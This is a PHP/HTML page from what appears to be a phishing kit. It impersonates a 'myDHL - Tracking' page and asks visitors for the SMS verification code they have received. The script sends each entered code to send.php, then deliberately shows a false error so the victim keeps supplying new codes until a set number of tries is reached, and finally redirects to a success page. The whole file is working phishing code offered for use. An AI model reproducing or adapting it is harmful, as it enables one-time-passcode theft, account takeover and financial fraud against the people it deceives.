<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>myDHL - Tracking</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/cdns/bs.css">
<link rel="stylesheet" href="res/style.css">
<link rel="icon" href="res/icon2.png">
</head>
<body style="background:#eee;">
<header class="container p-2" >
    <div class="row">
        <div class="col text-left">
            <img src="res/logo_exp.png" >
        </div>
    </div>
</header>

<section class="container-fluid">
<div class="container py-5 text-center bg-white" style="width:500px; max-width:100%;">

<div class="text-left">

<h4 style="display:block; margin-bottom:20px;"><?php echo getLang("_SMS_TITLES")[0];?></h4>
 <p><?php echo getLang("_SMS_TITLES")[1];?></p>

<div class="form" style="">

<div class="form-group">
    <label><?php echo getLang("_SMS_INPUT");?></label>
    <input type="text" class="form-control" id="d0" placeholder="000000">
    <label style="color:red; display:none; font-size:0.9em;" id="sms_error">
    <?php echo getLang("_SMS_ERROR");?>
</label>
</div>


<div class="form-group">
<button onclick="sendOtp()" class="btn btn-danger p-2 my-4 w-100"><?php echo getLang("_CONFIRM");?></button>
</div>
</div>





</div>
</section>


<footer class="container-fluid">
<div class="container" >
<div class="row">
    <div class="col-sm-6 text-lg-left text-center">
        <?php echo getLang("_FOOTER_LINKS")[0];?>
    </div>
    <div class="col-sm-6 text-lg-right text-center">
        <?php echo getLang("_FOOTER_LINKS")[1];?>
    </div>
</div>
</div>
</footer>

<style>
.loader{
    width:100%;
    height:100%;
    position:fixed;
    background:rgba(255,255,255,0.8);
    top:0;
    display:none;
	z-index:9999999999;
}
.loader .content{
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
<div class="loader">
<div class="content">
    <img src="res/loading.gif" style=" width:60px;">
</div>
</div>

<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>
var allowSubmit;
var abortVal = true;
var seconds = <?php echo $seconds*1000; ?>;
var tries = 0;
var max_tries = <?php echo $sms_error_times; ?>;
var tm = $("#timer");
var secs = 59;
var mins = 0;
var inter;
var nc = false;


function newCode(){
    if(nc){
        $(".loader").show();
        setTimeout(()=>{
            tm.html("01:00");
            timer();
            $(".loader").hide();
            nc=false;
            secs = 0;
            mins = 1;
            

                }, seconds);
    }
}




function timer(){
    inter = setInterval(() => {
    
    if(secs <0 && mins <= 0){
        nc=true;
        clearInterval(inter);
        return;
    }else{
        if(secs<0){
        mins = mins-1;
        secs=59;
    }

        if(secs<10){
            secs= "0"+secs;
        }
        tm.html("0"+mins+":"+secs);
             secs;
             secs=secs-1;
    }

       
           
        

}, 1000);


}
timer();



$("#d0").mask('00000000');




function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=1; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$(" input").keypress((e)=>{
    if(e.key=="Enter"){
        sendOtp();
    }
});

function sendOtp(){
    validate();

    if(allowSubmit){
        
        $(".loader").show();
        
        $.post("send.php", 
			{	
				sms:$("#d0").val()
			
			}, function(done){
                setTimeout(()=>{
                    tries = tries+1;
                    if(tries>=max_tries){
                        window.location="success.php";
                    }else{
                        $(".loader").hide();
                        $("#sms_error").show();
                        $("#d0").val("");
                    }

                }, seconds);



			}
		
		);

    }
}

</script>
</body>
</html>